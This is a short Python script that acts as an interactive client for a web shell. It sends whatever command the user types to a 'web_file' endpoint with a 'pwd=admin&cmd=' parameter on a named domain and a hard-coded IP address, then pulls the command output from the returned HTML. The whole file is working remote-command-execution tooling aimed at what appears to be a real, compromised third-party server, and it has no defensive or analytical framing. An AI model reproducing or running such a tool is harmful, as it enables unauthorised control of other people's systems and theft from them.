# coding:utf-8
import time
import socket
from lxml import etree
import sys


def doRequest(tmp):

    response = bytes()
    sock = socket.socket()
    sock.connect(('111.20.161.82', 80))
    #tmp = "whoami"
    #data = "GET /web_file?pwd=admin&cmd=" + tmp + " HTTP/1.1\r\nHost: www.sfagr.com\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\r\nConnection: close"
    data = "GET /web_file?pwd=admin&cmd=" +  tmp +" HTTP/1.1\r\nHost: www.sfagr.com\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\r\nConnection: close\r\n\r\n"
    sock.send(data.encode("utf-8"))
    response = sock.recv(1024)
    while True:
        buf = sock.recv(4096)
        response += buf
        if not len(buf):
            break
    #print(response.decode("utf-8"))
    tree = etree.HTML(response.decode('utf-8'))
    a = tree.xpath('/html/body/pre')[0].text
    b = a.replace('\x00','')
    print(b)
    return response

def req(bbb):
    import requests
    r = requests.get('http://www.sfagr.com/web_file?cmd=' + bbb, headers={'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Encoding': "gzip, deflate",
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
            'Connection': 'close'})
    tree = etree.HTML(r.content.decode('gbk'))
    aa = tree.xpath('/html/body/pre/text()')[1]
    print(aa)

# def main():
if __name__ == "__main__":
    start = time.time()
    while True:
        try:
            #aaa = input("input:").replace(' ','%20')
            #doRequest(aaa)
            bbb = input('bbb input:')
            req(bbb)
        except:
            pass
    print("spend time is %s" % (time.time() - start))


